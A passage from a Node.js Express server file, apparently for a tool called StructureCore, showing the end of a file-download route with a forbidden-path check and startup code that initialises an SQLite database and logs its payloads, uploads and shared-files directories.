        return res.status(403).send('Forbidden');
    }
    
    if (fs.existsSync(fullPath)) {
        res.download(fullPath);
    } else {
        res.status(404).send('File not found');
    }
});

// Start server & initialize Database
db.initDatabase()
  .then(() => {
      app.listen(PORT, () => {
          console.log(`[!] StructureCore server running on http://localhost:${PORT}`);
          console.log(`[!] Payloads directory: ${PAYLOADS_DIR}`);
          console.log(`[!] Uploads directory: ${UPLOADS_DIR}`);
          console.log(`[!] Shared files directory: ${SHARED_FILES_DIR}`);
      });
  })
  .catch(err => {
      console.error('Fatal: Failed to initialize SQLite database:', err);
      process.exit(1);
  });
